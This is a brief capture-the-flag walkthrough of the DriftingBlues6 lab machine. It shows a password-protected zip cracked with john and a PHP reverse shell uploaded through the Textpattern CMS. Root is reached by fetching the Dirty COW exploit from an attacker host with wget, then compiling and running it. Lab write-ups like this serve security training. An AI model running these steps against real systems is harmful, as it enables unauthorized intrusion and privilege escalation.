----------------------------------------------------
# Author -> Shubham Rannpise
----------------------------------------------------
# DriftingBlues6
# 1/1/2023

----------------------------------------------------
# nmap result
----------------------------------------------------
PORT      STATE    SERVICE         VERSION
80/tcp    open     http            Apache httpd 2.2.22 ((Debian))

----------------------------------------------------
robots.txt
----------------------------------------------------
->
User-agent: *
Disallow: /textpattern/textpattern
dont forget to add .zip extension to your dir-brute
;)
----------------------------------------------------
# got cms login panel at(/textpattern/textpattern)
----------------------------------------------------
finding creds

we know from robots.tx
we have add .zip extention  hopefully we find something
we got zip file
spammer.zip

but it is password protected
lets try to crack with john

zip2john spammer.zip > hash
john hash --wordlist=/usr/share/wordlists/rockyou.txt
got password for zip > myspace4

cat creds.txt 
mayer:lionheart     
use this to login cms                                         

----------------------------------------------------
exploitation (cms textpattern v4.8.3)
----------------------------------------------------
exploit available at searchsploit
searchsploit -m 48943.py
python3 48943.py http://192.168.75.219/textpattern/textpattern/ mayer lionheart  
unfortunately exploit doesnt work

but on cms site we can upload the php files and acces it to execute
lets upload a php reverse
http://192.168.75.219/textpattern/files/

----------------------------------------------------
privilege escalation
----------------------------------------------------
vulnerable kernel version
3.2.0-4-amd64
exploit availble at exploit.db
https://www.exploit-db.com/exploits/40839

wget http://192.168.49.75:80/40839.c

gcc -pthread 40839.c -o dirty -lcrypt
su firefart

download it compile it execute it
you got root